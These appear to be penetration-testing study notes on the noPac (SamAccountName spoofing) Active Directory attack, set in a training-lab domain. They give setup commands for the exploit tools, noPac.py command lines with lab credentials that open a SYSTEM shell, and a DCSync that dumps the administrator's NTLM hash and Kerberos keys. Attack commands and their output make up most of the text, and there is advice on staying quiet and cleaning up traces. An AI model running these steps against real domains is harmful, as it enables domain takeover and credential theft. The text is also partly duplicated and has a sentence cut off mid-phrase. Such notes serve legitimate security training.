[Sam_The_Admin vulnerability](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699), also called `noPac` or referred to as `SamAccountName Spoofing`
https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware
how this attack works:

- Create the initial computer account (with '$')
- Request and acquire a TGT (while the account still has '$')
- AFTER acquiring the TGT, RENAME the account to something entirely different (like "beckens")
- Request a TGS (Ticket Granting Service) ticket
- Domain Controller tries to validate:
  - Can't find the account name
  - Tries to find a matching account by appending '$'
  - This creates the vulnerability where it might incorrectly validate or create a new account and allow shell access

# Setup:

#### Ensuring Impacket is Installed

```shell-session
$ git clone https://github.com/SecureAuthCorp/impacket.git
```

```shell-session
$ python setup.py install
```

#### Cloning the NoPac Exploit Repo

```shell-session
$ git clone https://github.com/Ridter/noPac.git
```

Once Impacket is installed and we ensure the repo is cloned to our attack box, we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (`scanner.py`) then use the exploit (`noPac.py`) to gain a shell as `NT AUTHORITY/SYSTEM`. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the `ms-DS-MachineAccountQuota` number is set to 10. In some environments, an astute sysadmin may set the `ms-DS-MachineAccountQuota` value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to `0` can prevent quite

=============================================================

# NOPAC + DCSYNC

#### Running NoPac & Getting a Shell

```shell-session
$ sudo python3 noPac.py blackwood.local/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host DC01 -shell --impersonate administrator -use-ldap
```

We will notice that a `semi-interactive shell session` is established with the target using [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py). Keep in mind with smbexec shells we will need to use exact paths instead of navigating the directory structure using `cd`.

It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use `ls` to confirm.

#### Confirming the Location of Saved Tickets

```shell-session
$ ls

administrator_DC01.blackwood.local.ccache  noPac.py   requirements.txt  utils
README.md  scanner.py
```

We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the `-dump` flag to perform a DCSync using secretsdump.py. This method would still create a ccache file on disk, which we would want to be aware of and clean up.

`Using noPac to DCSync the Built-in Administrator Account`

```shell-session
$ sudo python3 noPac.py blackwood.local/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host DC01 --impersonate administrator -use-ldap -dump -just-dc-user BLACKWOOD/administrator


[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target DC01.blackwood.local
[*] will try to impersonat administrator
[*] Alreay have user administrator ticket for target DC01.blackwood.local
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
blackwood.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
blackwood.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
blackwood.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
blackwood.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...
```

# smbexec is bad for opsec

If opsec or being "quiet" is a consideration during an assessment, we would most likely want to avoid a tool like smbexec.py. The focus of this module is on tactics and techniques. We will refine our methodology as we progress in more advanced modules, but we first must obtain a solid base in enumerating and attacking Active Directory.

---

[Sam_The_Admin vulnerability](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699), also called `noPac` or referred to as `SamAccountName Spoofing`
https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware
how this attack works:

- Create the initial computer account (with '$')
- Request and acquire a TGT (while the account still has '$')
- AFTER acquiring the TGT, RENAME the account to something entirely different (like "beckens")
- Request a TGS (Ticket Granting Service) ticket
- Domain Controller tries to validate:
  - Can't find the account name
  - Tries to find a matching account by appending '$'
  - This creates the vulnerability where it might incorrectly validate or create a new account and allow shell access

# NOPAC + DCSYNC

#### Running NoPac & Getting a Shell

Bleeding Edge Vulnerabilities
![](Active%20Directory/Windows/Active%20Directory/modules/OSINT/noPac_image4.gif)

```shell-session
$ sudo python3 noPac.py blackwood.local/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host DC01 -shell --impersonate administrator -use-ldap

███    ██  ██████  ██████   █████   ██████
████   ██ ██    ██ ██   ██ ██   ██ ██
██ ██  ██ ██    ██ ██████  ███████ ██
██  ██ ██ ██    ██ ██      ██   ██ ██
██   ████  ██████  ██      ██   ██  ██████

[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target DC01.blackwood.local
[*] will try to impersonat administrator
[*] Adding Computer Account "WIN-LWJFQMAXRVN$"
[*] MachineAccount "WIN-LWJFQMAXRVN$" password = &A#x8X^5iLva
[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &A#x8X^5iLva.
[*] WIN-LWJFQMAXRVN$ object = CN=WIN-LWJFQMAXRVN,CN=Computers,DC=BLACKWOOD,DC=LOCAL
[*] WIN-LWJFQMAXRVN$ sAMAccountName == DC01
[*] Saving ticket in DC01.ccache
[*] Resting the machine account to WIN-LWJFQMAXRVN$
[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] Saving ticket in administrator.ccache
[*] Remove ccache of DC01.blackwood.local
[*] Rename ccache with target ...
[*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$
[-] Delete computer WIN-LWJFQMAXRVN$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

We will notice that a `semi-interactive shell session` is established with the target using [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py). Keep in mind with smbexec shells we will need to use exact paths instead of navigating the directory structure using `cd`.

It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use `ls` to confirm.

#### Confirming the Location of Saved Tickets

```shell-session
$ ls

administrator_DC01.blackwood.local.ccache  noPac.py   requirements.txt  utils
README.md  scanner.py
```

We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the `-dump` flag to perform a DCSync using secretsdump.py. This method would still create a ccache file on disk, which we would want to be aware of and clean up.

#### Using noPac to DCSync the Built-in Administrator Account

Bleeding Edge Vulnerabilities

```shell-session
$ sudo python3 noPac.py blackwood.local/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host DC01 --impersonate administrator -use-ldap -dump -just-dc-user BLACKWOOD/administrator

███    ██  ██████  ██████   █████   ██████
████   ██ ██    ██ ██   ██ ██   ██ ██
██ ██  ██ ██    ██ ██████  ███████ ██
██  ██ ██ ██    ██ ██      ██   ██ ██
██   ████  ██████  ██      ██   ██  ██████

[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target DC01.blackwood.local
[*] will try to impersonat administrator
[*] Alreay have user administrator ticket for target DC01.blackwood.local
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
blackwood.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
blackwood.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
blackwood.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
blackwood.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...
```

# smbexec is bad for opsec

If opsec or being "quiet" is a consideration during an assessment, we would most likely want to avoid a tool like smbexec.py. The focus of this module is on tactics and techniques. We will refine our methodology as we progress in more advanced modules, but we first must obtain a solid base in enumerating and attacking Active Directory.

---
